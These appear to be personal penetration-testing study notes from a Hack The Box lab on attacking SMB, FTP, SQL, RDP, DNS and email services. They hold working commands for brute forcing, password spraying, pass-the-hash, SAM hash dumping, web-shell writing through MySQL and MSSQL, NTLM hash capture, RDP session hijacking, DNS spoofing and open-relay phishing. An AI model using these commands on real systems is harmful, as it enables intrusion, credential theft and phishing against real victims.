# interacting with the Common services.

# File sharing service.

- SMB, NFS, FTP, TFTP, SFTP
- cloud - Dropbox, Google Drive, OneDrive, SharePoint, AWS S3, Azure Blob Storage, or Google Cloud Storage

****

# SMB 

## GUI intraction
1. `[WINKEY] + [R]`
2. \\192.168.220.129\Finance\ # this is an example.
**Note** if the the smb allows ananomous then we access the dir, or we prompt to authanticate it

## CMD Commands
`net use` connects a computer to or disconnects a computer from a shared resource or displays information about computer connections.

    net use n: \\192.168.220.129\Finance # mape it to driver n
    net use n: \\192.168.220.129\Finance /user:plaintext Password123    #with authanticate

    dir n: /a-d /s /b | find /c ":\"     #count the number os files inthe dir and sub dir.

    dir n:\*cred* /s /b                  #search for file with name having cred
    findstr /s /i cred n:\*.*            #search for words in the file 

know more about the [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples)



| Syntax|	Description|
|-|-|
| dir|	Application|
| n:|	Directory or drive to search|
| /a-d|	/a is the attribute and -d means not directories|
| /s	|Displays files in a specified directory and all subdirectories|
| /b	|Uses bare format (no heading information or summary)|


### powershell Commands

    Get-ChildItem \\192.168.220.129\Finance\                        # 
    New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"     #insted of net use use New-PSDrive

    

**PSCredintials objects**

    $username = 'plaintext'
    $password = 'Password123'
    $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword


    (Get-ChildItem -File -Recurse | Measure-Object).Count     #cmd to count files in sub dir.
    Get-ChildItem -Recurse -Path N:\ -Include *cred* -File    #search for file name having cred
    Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List #search string like grep and it is userd to search the keyword for file and the text inside the file both.

## SBM in Linux
    sudo mkdir /mnt/Finance
    sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance           # example.

    //With auth 
    mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile

    //structure of the credentialfile
    username=plaintext
    password=Password123
    domain=.

**Note:** We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

**Hunting**

    find /mnt/Finance/ -name *cred*    #hunting for the folder name having cred substring.
    grep -rn /mnt/Finance/ -ie cred    #find the file that have contains cred.

# EMAIL

For recive and send emaim we need only one protocol that is `SMTP` this one send the email over the internt, and for reciving email we use the `POP3` and `IMAP`we are using the evolutin for this 

**install evolution**

    sudo apt-get install evolution

**Note:** If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.

# Database
**3 ways to connect to the databse.**

1.	Command Line Utilities (mysql or sqsh)
2.	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
3.	Programming Languages

## MSSQL 

    sqsh -S 10.129.20.13 -U username -P Password123             #Linux
    sqlcmd -S 10.129.20.13 -U username -P Password123           #windows

## MYSQL

    mysql -u username -pPassword123 -h 10.129.20.13             #linux
    mysql.exe -u username -pPassword123 -h 10.129.20.13         #windows

**Connecting GUI for Database**

for mysql we use MySQL Workbench for both windows and linux and for MSSQL we use SSMS for windows only, and for linux having aulernative like  [dbeaver](https://github.com/dbeaver/dbeaver)

    sudo dpkg -i dbeaver-<version>.deb       #installation.
    dbeaver &                                #run 

SMB|	FTP|	Email|	Databases
|-|-|-|-|
smbclient|	ftp|	Thunderbird|	mssql-cli
CrackMapExec|	lftp|	Claws|	mycli
SMBMap|	ncftp	|Geary|	mssqlclient.py
Impacket	|filezilla|	MailSpring|	dbeaver
psexec.py	|crossftp|	mutt|	MySQL Workbench
smbexec.py	|	| mailutils	|SQL Server Management Studio or SSMS
| | | 	sendEmail |
| | | 	swaks |
| | | 	sendmail |

# Concept of Attack

![Concept of Attack](image.png)

There are two key elements to finding sensitive information:

- We need to understand the service and how it works.
- We need to know what we are looking for.

# Attacking FTP

We can use the commands ls and cd to move around directories like in Linux. To download a single file, we use get, and to download multiple files, we can use mget. For upload operations, we can use put for a simple file or mput for multiple files.

**Enumeration**

    sudo nmap -sC -sV -p 21 192.168.2.142 

**BruteForcing**

Medusa, we can use the option -u to specify a single user to target, or you can use the option -U to provide a file with a list of usernames. The option -P is for a file containing a list of passwords. We can use the option -M and the protocol we are targeting (FTP) and the option -h for the target hostname or IP address.

    medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

**FTP Bounce Attack**
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.

    nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

# Attacking SMB
Server message block using TCP port 139 and UDP ports 137 and 138. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer.
Another protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call).

**Enumeration**

    sudo nmap 10.129.14.128 -sV -sC -p139,445

**Misconfigurations**
**Anonymous Authentication -** tools that interact with SMB allow null session connectivity, including smbclient, smbmap, rpcclient, or enum4linux.

File Share - Using smbclient, we can display a list of the server's shares with the option -L, and using the option -N, we tell smbclient to use the null session.
    
    smbclient -N -L //10.129.14.128

smbmap - Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.

    smbmap -H 10.129.14.128

Using smbmap with the -r or -R (recursive) option, one can browse the directories:

    smbmap -H 10.129.14.128 -r notes

the permissions are set to READ and WRITE, which one can use to upload and download the files.

    smbmap -H 10.129.14.128 --download "notes\note.txt"             #to download the file
    smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"      #to upload the file

Remote Procedure Call (RPC) rpcclient - rpcclient tool with a null session to enumerate a workstation or Domain Controller.

    rpcclient -U'%' 10.10.110.17
    rpcclient $> enumdomusers


Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

    ./enum4linux-ng.py 10.10.11.45 -A -C

**Protocol Specifics Attacks**  Brute Forcing and Password Spray,  Let's explore the tool CrackMapExec that includes the ability to execute password spraying.

    crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

**SMB**
When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

Remote Command Execution
Extract Hashes from SAM Database
Enumerating Logged-on Users
Pass-the-Hash (PTH)


Remote code execution - PsExec is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually.

We can download PsExec from Microsoft website, or we can use some Linux implementations:

- Impacket PsExec - Python PsExec like functionality example using RemComSvc.
- Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- CrackMapExec - includes an implementation of smbexec and atexec.
- Metasploit PsExec - Ruby PsExec implementation.

Impacket PsExec - To connect to a remote machine with a local administrator account, using impacket-psexec,
same options apply to impacket-smbexec and impacket-atexec.

    impacket-psexec administrator:'Password123!'@10.10.110.17


CrackMapExec - we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.

    crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

**Enumerating Logged-on Users**

    crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

**Extract Hashes from SAM Database**

    crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
    crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE  #PtH

**Forced Authentication Attacks**

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.

# Attacking SQL Databases
MySQL and Microsoft SQL Server (MSSQL) are relational database management systems that store data in tables, columns, and rows. 

**Enumeration**

MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. 

    nmap -Pn -sV -sC -p1433 10.10.10.125

**Authentication Mechanisms**

MSSQL 

Authentication Type|	Description
|-|-|
Windows authentication mode|	This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
Mixed mode|	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). 

**Connecting to the SQL Server**

    mysql -u julio -pPassword123 -h 10.129.20.13              #mysql 
    sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30  #mssql in windows
    sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h         #mssql in linux
    sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h      #need to define the domain or host name
    mssqlclient.py -p 1433 julio@10.129.203.7                 #impacket

MySQL default system schemas/databases:

- mysql - is the system database that contains tables that store information required by the MySQL server
- information_schema - provides access to database metadata
- performance_schema - is a feature for monitoring MySQL Server execution at a low level
- sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:

- master - keeps the information for an instance of SQL Server.
- msdb - used by SQL Server Agent.
- model - a template database copied for each new database.
- resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
- tempdb - keeps temporary objects for SQL queries.

## **MySQL**

    SHOW DATABASES;
    USE htbusers;
    SHOW TABLES;
    SELECT * FROM users;

    

**Write Local Files**
MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands.

    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT â€¦ INTO OUTFILE statements and the LOAD_FILE() function.

    show variables like "secure_file_priv";    #see the permission for write files 

**Read Local Files in MySQL**

    select LOAD_FILE("/etc/passwd");


## **MSSQL**

    #To see database.
    1> SELECT name FROM master.dbo.sysdatabases
    2> GO

    #To active DB
    1> USE htbusers
    2> GO   

    #To see tables
    1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
    2> GO


    #TO see data
    1> SELECT * FROM users
    2> go

**XP_CMDSHELL**

    1> xp_cmdshell 'whoami'
    2> GO

If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

    -- To allow advanced options to be changed.  
    EXECUTE sp_configure 'show advanced options', 1
    GO

    -- To update the currently configured value for advanced options.  
    RECONFIGURE
    GO  

    -- To enable the feature.  
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO  

    -- To update the currently configured value for this feature.  
    RECONFIGURE
    GO

To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges

**Enable Ole Automation Procedures**

    1> sp_configure 'show advanced options', 1
    2> GO
    3> RECONFIGURE
    4> GO
    5> sp_configure 'Ole Automation Procedures', 1
    6> GO
    7> RECONFIGURE
    8> GO

**MSSQL - Create a File**

    1> DECLARE @OLE INT
    2> DECLARE @FileID INT
    3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    6> EXECUTE sp_OADestroy @FileID
    7> EXECUTE sp_OADestroy @OLE
    8> GO


**Read Local Files**

    1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    2> GO

**Capture MSSQL Service Hash**
**XP_DIRTREE Hash Stealing**

    1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
    2> GO

**XP_SUBDIRS Hash Stealing**

    1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
    2> GO

**XP_SUBDIRS Hash Stealing with Responder**

    sudo responder -I tun0

**XP_SUBDIRS Hash Stealing with impacket**

    sudo impacket-smbserver share ./ -smb2support

**Impersonate Existing Users with MSSQL**
    
    1> SELECT distinct b.name
    2> FROM sys.server_permissions a
    3> INNER JOIN sys.server_principals b
    4> ON a.grantor_principal_id = b.principal_id
    5> WHERE a.permission_name = 'IMPERSONATE'
    6> GO

**Verifying our Current User and Role**
    1> SELECT SYSTEM_USER
    2> SELECT IS_SRVROLEMEMBER('sysadmin')
    3> go

**Impersonating the SA User**

    1> EXECUTE AS LOGIN = 'sa'
    2> SELECT SYSTEM_USER
    3> SELECT IS_SRVROLEMEMBER('sysadmin')
    4> GO

**Identify linked Servers in MSSQL**

    1> SELECT srvname, isremote FROM sysservers
    2> GO

    1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    2> GO

# Attacking RDP
Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. RDP uses port TCP/3389. Using Nmap, we can identify the available RDP service on the target host:

    nmap -Pn -p3389 192.168.2.143 

## Misconfigurations

Using the Crowbar tool, we can perform a password spraying attack against the RDP service

    crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
    hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

We can RDP into the target system using the rdesktop client or xfreerdp client with valid credentials.

    rdesktop -u admin -p password123 192.168.2.143

**Protocol Specific Attacks**

RDP Session Hijacking 

    query user
    tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png

    net start sessionhijack

https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png

**RDP Pass-the-Hash (PtH)**
what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database

https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png

    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

    xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

# Attacking DNS

The Domain Name System (DNS) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly UDP/53, but DNS will rely on TCP/53 more heavily as time progresses


**Enumuration**

    nmap -p53 -Pn -sV -sC 10.10.110.213

**DNS Zone Transfer**

    dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
    fierce --domain zonetransfer.me

**Domain Takeovers & Subdomain Enumeration**

Domain takeover is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.

Domain takeover is also possible with subdomains called subdomain takeover. A DNS's canonical name (CNAME) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. 

*Subdomain Enumeration*

    ./subfinder -d inlanefreight.com -v   


    git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
    cd subbrute
    echo "ns1.inlanefreight.com" > ./resolvers.txt
    ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt


    host support.inlanefreight.com

The can-i-take-over-xyz repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.


**DNS Spoofing/Cache poisining**

- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (MITM) attack.

- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.


*Local DNS Cache Poisoning*

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap. To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name  (e.g., inlanefreight.com)  that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:

    Keshri@htb[/htb]# cat /etc/ettercap/etter.dns

    inlanefreight.com      A   192.168.225.110
    *.inlanefreight.com    A   192.168.225.110

Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.

Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110

After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110


In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well

# Attacking Email Services


**Enumeration**

    host -t MX hackthebox.eu
    host -t MX microsoft.com

    dig mx plaintext.do | grep "MX" | grep -v ";"
    dig mx inlanefreight.com | grep "MX" | grep -v ";"
    host -t A mail1.inlanefreight.htb.

These MX records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.


Port	|Service
|-|-|
TCP/25|	SMTP Unencrypted
TCP/143|	IMAP4 Unencrypted
TCP/110|	POP3 Unencrypted
TCP/465|	SMTP Encrypted
TCP/587|	SMTP Encrypted/STARTTLS
TCP/993|	IMAP4 Encrypted
TCP/995|	POP3 Encrypted


    sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

**Misconfigurations**

VRFY this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."

RCPT TO identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.

To automate our enumeration process, we can use a tool named smtp-user-enum. 

    smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

**Cloud Enumeration**
O365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by ZDH. This tool reimplements a collection of enumeration and spray techniques

    python3 o365spray.py --validate --domain msplaintext.xyz
    python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   

**Password Attacks**

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as o365spray or MailSniper for Microsoft Office 365 or CredKing for Gmail or Okta. 

    hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
    python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz


**Protocol Specifics Attacks (open relay attack)**

An open relay is a Simple Transfer Mail Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.


    swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
